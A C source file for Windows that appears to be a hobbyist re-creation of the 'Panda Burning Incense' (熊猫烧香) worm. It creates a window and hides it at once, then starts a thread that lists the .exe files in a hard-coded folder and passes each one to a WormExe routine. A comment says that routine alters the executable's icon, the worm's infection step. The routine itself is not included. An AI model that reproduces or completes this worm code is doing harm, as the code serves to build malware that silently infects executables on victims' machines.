#include "Panda.h"
#include "resource.h"
#include "Global.h"



int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	TCHAR szAppClassName[] = TEXT("Panda");

	WNDCLASS wndClass;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 0; 
	wndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndClass.hIcon = LoadIcon(hInstance,MAKEINTRESOURCE(IDI_ICON1));
	wndClass.hInstance = hInstance;
	wndClass.lpfnWndProc = WindowsProc;
	wndClass.lpszClassName = szAppClassName;
	wndClass.lpszMenuName = NULL;
	wndClass.style = CS_VREDRAW | CS_HREDRAW;

	RegisterClass(&wndClass);

	HWND hWnd = CreateWindow(szAppClassName, TEXT("熊猫烧香"), WS_OVERLAPPEDWINDOW, 200, 100, 800, 600, NULL, NULL, hInstance, NULL);

	ShowWindow(hWnd, SW_HIDE);
	UpdateWindow(hWnd);

	MSG msg;
	while (GetMessage(&msg,NULL,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}

//窗口处理函数
LRESULT CALLBACK WindowsProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	static HANDLE hPandaThread = NULL;

	switch (uMsg)
	{
	case WM_CREATE:
		//创建一个线程
		hPandaThread = CreateThread(NULL, NULL, PandaProc, NULL, NULL, NULL);
		break;
	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	}

	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}


//线程处理函数
DWORD WINAPI PandaProc(LPVOID lpParam)
{
	TCHAR szFindPath[MAX_PATH] = TEXT("C:\\Users\\11413\\Desktop\\qqq");

	//查找到所有文件
	WIN32_FIND_DATA FindFileData = { 0 };
	HANDLE hFinder = FindFirstFile(TEXT("C:\\Users\\11413\\Desktop\\qqq\\*.exe"), &FindFileData);

	if (hFinder == INVALID_HANDLE_VALUE)
		return 0;

	while (TRUE)
	{
		//如果为文件
		if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
			TCHAR szExePath[MAX_PATH];
			sprintf(szExePath, TEXT("%s\\%s"), szFindPath, FindFileData.cFileName);

			//修改指定EXE可执行文件的图标
			WormExe(szExePath);
		}		
		if (!FindNextFile(hFinder, &FindFileData))
			break;

	}
	FindClose(hFinder);

	return 0;
}